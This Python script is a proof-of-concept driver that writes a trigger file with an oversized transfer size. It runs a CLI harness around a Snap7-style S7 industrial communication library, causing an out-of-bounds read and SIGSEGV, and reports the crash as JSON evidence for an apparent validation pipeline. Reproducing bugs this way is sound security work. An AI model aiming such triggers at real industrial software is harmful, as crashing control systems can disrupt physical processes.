#!/usr/bin/env python3
"""PoC driver for the s7dl trigger-file target.

The target binary is a standalone CLI that exercises an industrial network
client library (Snap7-style S7 data transfer).  It is invoked as:

    <binary> <trigger-file>

where the trigger file is laid out as:

    bytes 0..4   little-endian signed 32-bit start offset
    bytes 4..8   little-endian signed 32-bit transfer size
    bytes 8..    caller data buffer (arbitrary bytes)

The program prints a summary line ``start=.. size=.. buff_len=..`` and then
performs the described data-transfer operation on the caller buffer.

This script dynamically constructs a trigger file whose (start, size) pair
asks the target to transfer far more data than the caller buffer holds.  The
resulting out-of-bounds read in the library transfer routine faults the
process, which we capture and report through the JSON contract below.

Usage:
    python3 poc.py --binary <path-to-binary> [--json-out out.json] [--timeout SEC]
"""

import argparse
import json
import os
import signal as signal_module
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timezone

# --- trigger payload parameters (built at run time, not read from disk) -----
# A small caller buffer, with a transfer size that runs well past its end.
START_OFFSET = 0
TRANSFER_SIZE = 4096
BUFFER_FILL = b"A"


def build_trigger_bytes():
    """Construct the full trigger payload in memory.

    Returns the 8-byte header (start, size as little-endian signed 32-bit)
    followed by the caller data buffer.
    """
    buffer_bytes = BUFFER_FILL * 16
    header = (
        START_OFFSET.to_bytes(4, byteorder="little", signed=True)
        + TRANSFER_SIZE.to_bytes(4, byteorder="little", signed=True)
    )
    return header + buffer_bytes


def signal_name(sig_num):
    """Map a signal number to its conventional name, e.g. 11 -> 'SIGSEGV'."""
    if sig_num is None:
        return None
    try:
        name = signal_module.Signals(abs(int(sig_num))).name
    except (ValueError, AttributeError):
        return None
    return name if name.startswith("SIG") else "SIG%s" % name


def normalize_output(text, limit=20000):
    """Trim captured process output to a bounded, JSON-safe string."""
    if not text:
        return ""
    text = text.replace("\r\n", "\n").replace("\r", "\n")
    if len(text) > limit:
        text = text[:limit] + "...[truncated]"
    return text


def build_observable(proc, returncode, sig_name, timed_out, stdout_text,
                     stderr_text):
    """Assemble the validator-facing evidence of the run outcome."""
    if timed_out:
        kind = "combined_output"
        value = "timeout: target did not exit within the allotted time"
        return {"kind": kind, "value": value, "path": None}

    if sig_name is not None:
        kind = "crash_trace"
        evidence = [
            "target terminated by signal %s (returncode=%d)" % (sig_name, returncode),
            "trigger: start=%d size=%d buff_len=%d"
            % (START_OFFSET, TRANSFER_SIZE, len(BUFFER_FILL * 16)),
            "stdout: %s" % (stdout_text.strip() or "<empty>"),
            "stderr: %s" % (stderr_text.strip() or "<empty>"),
            "verdict: SIGSEGV on out-of-bounds data-transfer read",
        ]
        return {"kind": kind, "value": "\n".join(evidence), "path": None}

    if proc is not None and returncode != 0:
        kind = "combined_output"
        value = "target exited with nonzero status %d" % returncode
        return {"kind": kind, "value": value, "path": None}

    kind = "combined_output"
    value = (stdout_text + stderr_text).strip() or "<no output>"
    return {"kind": kind, "value": value, "path": None}


def run_target(binary_path, timeout_sec):
    """Write the trigger file, execute the target, return a result dict."""
    trigger_bytes = build_trigger_bytes()

    tmp_dir = tempfile.mkdtemp(prefix="s7dl_poc_")
    trigger_path = os.path.join(tmp_dir, "trigger.bin")
    with open(trigger_path, "wb") as fh:
        fh.write(trigger_bytes)

    command = [binary_path, trigger_path]

    timed_out = False
    proc = None
    try:
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
        )
        try:
            out_bytes, err_bytes = proc.communicate(timeout=timeout_sec)
        except subprocess.TimeoutExpired:
            timed_out = True
            proc.kill()
            try:
                out_bytes, err_bytes = proc.communicate(timeout=5)
            except Exception:
                out_bytes, err_bytes = b"", b""
    except FileNotFoundError as exc:
        return {
            "command": command,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "custom",
                "value": "failed to launch target: %s" % exc,
                "path": None,
            },
            "error": "failed to launch target: %s" % exc,
        }

    elapsed_ms = int(getattr(proc, "_poc_elapsed_ms", 0))

    returncode = None
    sig_name = None
    if not timed_out:
        returncode = proc.returncode
        if returncode is not None and returncode < 0:
            sig_name = signal_name(returncode)

    stdout_text = normalize_output((out_bytes or b"").decode("utf-8", "replace"))
    stderr_text = normalize_output((err_bytes or b"").decode("utf-8", "replace"))

    observable = build_observable(
        proc, returncode, sig_name, timed_out, stdout_text, stderr_text
    )

    error = None
    if timed_out:
        error = "target run exceeded the timeout of %s seconds" % timeout_sec

    return {
        "command": command,
        "returncode": returncode,
        "signal": sig_name,
        "timed_out": timed_out,
        "runtime_ms": elapsed_ms,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": observable,
        "error": error,
    }


def main():
    parser = argparse.ArgumentParser(
        description="Trigger and record a memory-safety fault in the s7dl target."
    )
    parser.add_argument(
        "--binary",
        required=True,
        help="path to the target executable",
    )
    parser.add_argument(
        "--json-out",
        default=None,
        help="optional path to also write the JSON result object",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=30.0,
        help="per-run timeout in seconds (default: 30)",
    )
    args = parser.parse_args()

    binary_path = os.path.abspath(args.binary)
    if not os.path.isfile(binary_path):
        result = {
            "binary": args.binary,
            "command": [binary_path],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": "",
            "observable": {
                "kind": "custom",
                "value": "target binary not found: %s" % binary_path,
                "path": None,
            },
            "error": "target binary not found: %s" % binary_path,
        }
    else:
        started = time.monotonic()
        result = run_target(binary_path, args.timeout)
        if not result["runtime_ms"]:
            result["runtime_ms"] = int(round((time.monotonic() - started) * 1000))

    payload = {
        "binary": args.binary,
        "command": result["command"],
        "returncode": result["returncode"],
        "signal": result["signal"],
        "timed_out": result["timed_out"],
        "runtime_ms": result["runtime_ms"],
        "stdout": result["stdout"],
        "stderr": result["stderr"],
        "observable": result["observable"],
        "error": result["error"],
    }

    encoded = json.dumps(payload, indent=2)
    sys.stdout.write(encoded + "\n")

    if args.json_out:
        out_path = os.path.abspath(args.json_out)
        out_dir = os.path.dirname(out_path)
        if out_dir and not os.path.isdir(out_dir):
            os.makedirs(out_dir, exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as fh:
            fh.write(encoded + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())
